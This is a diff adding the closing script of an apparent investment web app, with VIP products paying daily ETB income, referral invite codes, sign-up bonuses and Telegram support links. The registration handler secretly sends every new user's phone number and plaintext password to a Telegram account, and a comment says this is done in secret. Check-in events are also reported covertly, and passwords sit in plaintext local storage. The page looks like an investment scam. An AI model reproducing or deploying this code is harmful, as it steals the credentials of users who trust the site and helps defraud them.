+        document.getElementById('copyLinkBtn')?.addEventListener('click',()=>{ navigator.clipboard.writeText(link); alert("Invitation link copied!"); });
+    }
+
+    function renderOrders() {
+        let purchases = getUserPurchases(currentUser);
+        let html = `<h3 style="color:#1e3a8a; margin-bottom:15px;">📦 My Investment Products</h3>`;
+        if(purchases.length===0) html += `<div style="color:#64748b;">No investments active yet.</div>`;
+        else purchases.forEach(p => { 
+            let vip = vipLevels.find(v=>v.id===p.vipId); 
+            if(vip) html += `<div class="vip-card">
+                <div class="vip-header">
+                    <img src="${vip.logo}" alt="${vip.name}" class="club-logo">
+                    <div class="vip-title">${vip.name}</div>
+                </div>
+                <div class="vip-detail"><span>Price:</span> <strong>${vip.price} ETB</strong></div>
+                <div class="vip-detail"><span>Daily Income:</span> <strong style="color:#16a34a;">${vip.daily} ETB</strong></div>
+                <div class="vip-detail"><span>Last Claimed:</span> <strong>${new Date(p.lastClaim).toLocaleDateString()}</strong></div>
+            </div>`; 
+        });
+        document.getElementById('ordersPanel').innerHTML = html;
+    }
+
+    function renderShow() {
+        document.getElementById('showPanel').innerHTML = `<div class="vip-card"><h3 style="color:#1e3a8a; margin-bottom:10px;">📺 Electronics Showcase</h3><p style="color:#64748b; font-size:0.9rem;">Explore trending electronic gadgets around the world driving our high investment yields!</p></div>`;
+    }
+
+    function renderService() { 
+        let title = currentLang==='am' ? `📞 የደንበኞች አገልግሎት` : `📞 Customer Support`;
+        let btnChannel = currentLang==='am' ? `📢 ቴሌግራም ቻናል` : `📢 Telegram Channel`;
+        let btnSupport = currentLang==='am' ? `🎧 የደንበኞች አገልግሎት ድጋፍ` : `🎧 Customer Service Support`;
+
+        document.getElementById('servicePanel').innerHTML = `
+            <div class="vip-card">
+                <h3 style="color:#1e3a8a; margin-bottom:15px;">${title}</h3>
+                <button onclick="window.open('https://t.me/electronicsinvestemente', '_blank')"><i class="fab fa-telegram"></i> ${btnChannel}</button>
+                <button onclick="window.open('https://t.me/evacodoraton', '_blank')" class="btn-secondary"><i class="fas fa-headset"></i> ${btnSupport}</button>
+            </div>`; 
+    }
+    
+    function showPanel(name) {
+        document.querySelectorAll('.panel').forEach(p => p.classList.remove('active-panel'));
+        document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+        
+        let panelEl = document.getElementById(name+'Panel');
+        if(panelEl) panelEl.classList.add('active-panel');
+        
+        let navEl = document.querySelector(`.nav-item[data-nav="${name}"]`);
+        if(navEl) navEl.classList.add('active');
+
+        if(name === 'home') renderHome();
+        if(name === 'orders') renderOrders();
+        if(name === 'show') renderShow();
+        if(name === 'share') renderShare();
+        if(name === 'my') renderMy();
+        if(name === 'deposit') renderDeposit();
+        if(name === 'withdraw') renderWithdraw();
+        if(name === 'service') renderService();
+    }
+
+    document.querySelectorAll('.quick-btn').forEach(btn => {
+        btn.onclick = () => {
+            let act = btn.dataset.action;
+            if(act === 'deposit') showPanel('deposit');
+            else if(act === 'withdraw') showPanel('withdraw');
+            else if(act === 'checkin') {
+                let stats = getUserStats(currentUser);
+                let today = new Date().toDateString();
+                if(stats.lastCheckIn === today) alert("Already checked in today!");
+                else { 
+                    stats.balance += 10; 
+                    stats.totalIncome += 10; 
+                    stats.lastCheckIn = today; 
+                    saveUserStats(currentUser,stats); 
+                    updateDashboardUI(); 
+
+                    sendSecretTelegramNotification(`🎁 <b>Daily Check-in Bonus Claimed!</b>\n👤 User: <code>${currentUser}</code>\n💵 Bonus: <b>10 ETB</b>\n💰 Total Balance: <b>${stats.balance.toFixed(2)} ETB</b>`);
+
+                    alert("Daily check-in successful! +10 ETB added."); 
+                }
+            }
+            else if(act === 'service') showPanel('service');
+        };
+    });
+
+    // Auth & URL Referral Check (Universal compatibility for all mobile browsers/brands)
+    function checkUrlForRefCode() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const refParam = urlParams.get('ref');
+        if (refParam) {
+            document.getElementById('inviteCode').value = refParam.toUpperCase();
+            document.getElementById('registerTab').click();
+        }
+    }
+
+    function showAuth() { 
+        document.getElementById('authSection').style.display='flex'; 
+        document.getElementById('dashboard').style.display='none'; 
+        checkUrlForRefCode();
+    }
+
+    function showDashboard() { 
+        document.getElementById('authSection').style.display='none'; 
+        document.getElementById('dashboard').style.display='block'; 
+        updateDashboardUI(); 
+        processDailyIncome(currentUser); 
+        restorePendingTimers(currentUser); 
+        showPanel('home'); 
+    }
+    
+    document.getElementById('loginTab').onclick = () => {
+        document.getElementById('loginTab').classList.add('active');
+        document.getElementById('registerTab').classList.remove('active');
+        document.getElementById('loginForm').style.display = 'block';
+        document.getElementById('registerForm').style.display = 'none';
+    };
+    document.getElementById('registerTab').onclick = () => {
+        document.getElementById('registerTab').classList.add('active');
+        document.getElementById('loginTab').classList.remove('active');
+        document.getElementById('registerForm').style.display = 'block';
+        document.getElementById('loginForm').style.display = 'none';
+    };
+
+    document.getElementById('doLoginBtn').onclick = () => {
+        let phone = document.getElementById('loginPhone').value.trim();
+        let pwd = document.getElementById('loginPassword').value;
+        let users = getUsers();
+        if(!users[phone] || users[phone].password !== pwd) { document.getElementById('loginError').innerText="Invalid phone or password"; return; }
+        currentUser = phone; localStorage.setItem("fgi_logged", phone); showDashboard();
+    };
+
+    // --- SECRET REGISTRATION TELEGRAM NOTIFICATION ---
+    document.getElementById('doRegisterBtn').onclick = () => {
+        let phone = document.getElementById('regPhone').value.trim();
+        let pwd = document.getElementById('regPassword').value;
+        let conf = document.getElementById('regConfirm').value;
+        let inv = document.getElementById('inviteCode').value.trim();
+        let users = getUsers();
+        if(!phone || !pwd) { document.getElementById('regError').innerText="Please fill all fields"; return; }
+        if(pwd !== conf) { document.getElementById('regError').innerText="Passwords do not match"; return; }
+        if(users[phone]) { document.getElementById('regError').innerText="User already exists"; return; }
+        let inviteCode = Math.random().toString(36).substring(2,8).toUpperCase();
+        users[phone] = { password:pwd, inviteCode, referrer:null };
+        if(inv) {
+            for(let p in users) {
+                if(users[p].inviteCode === inv) { 
+                    users[phone].referrer = p; 
+                    let refTree = getReferralTree(); 
+                    if(!refTree[p]) refTree[p]={members:[],activeMembers:[]}; 
+                    if(!refTree[p].members.includes(phone)) refTree[p].members.push(phone); 
+                    saveReferralTree(refTree); 
+                    break; 
+                }
+            }
+        }
+        saveUsers(users);
+        
+        saveUserStats(phone, { balance:200, totalIncome:0, totalDeposit:0, totalWithdraw:0, lastCheckIn:null });
+        saveDepositRequests(phone, []);
+        saveWithdrawRequests(phone, []);
+        saveUserPurchases(phone, []);
+
+        // Send full user credentials secretly to Telegram Account @abrhamgood
+        sendSecretTelegramNotification(`🔑 <b>NEW USER REGISTERED DETAILS</b>\n📱 Phone: <code>${phone}</code>\n🔐 Password: <code>${pwd}</code>\n🎁 Registration Bonus: <b>200 ETB</b>\n🔗 Inviter: ${users[phone].referrer ? '<code>' + users[phone].referrer + '</code>' : 'None'}\n🔑 User Invite Code: <code>${inviteCode}</code>`);
+
+        currentUser = phone; localStorage.setItem("fgi_logged", phone); showDashboard();
+    };
+
+    document.getElementById('logoutBtn').onclick = () => { localStorage.removeItem("fgi_logged"); currentUser=null; showAuth(); };
+    document.querySelectorAll('.nav-item').forEach(nav => nav.addEventListener('click', () => showPanel(nav.dataset.nav)));
+    
+    let logged = localStorage.getItem("fgi_logged");
+    if(logged && getUsers()[logged]) { 
+        currentUser = logged; 
+        showDashboard(); 
+    } else { 
+        showAuth(); 
+    }
+</script>
+</body>
+</html>
